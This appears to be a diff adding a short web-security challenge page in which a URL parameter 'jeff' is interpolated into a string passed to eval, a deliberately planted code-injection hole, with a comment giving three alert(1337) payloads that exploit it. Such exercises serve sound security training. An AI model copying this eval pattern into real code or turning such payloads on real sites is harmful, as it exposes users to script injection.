@@ -1,0 +1,16 @@
+<!-- Challenge -->
+<h2 id="maname"></h2>
+<script>
+    let jeff = (new URL(location).searchParams.get('jeff') || "JEFFF")
+    let ma = ""
+    eval(`ma = "Ma name ${jeff}"`)
+    setTimeout(_ => {
+        maname.innerText = ma
+    }, 1000)
+</script>
+
+<!--
+    ?jeff=";alert(1337);"
+    ?jeff=%22%3Balert%281337%29%3B%22
+    ?jeff="-alert(1337)-"
+-->
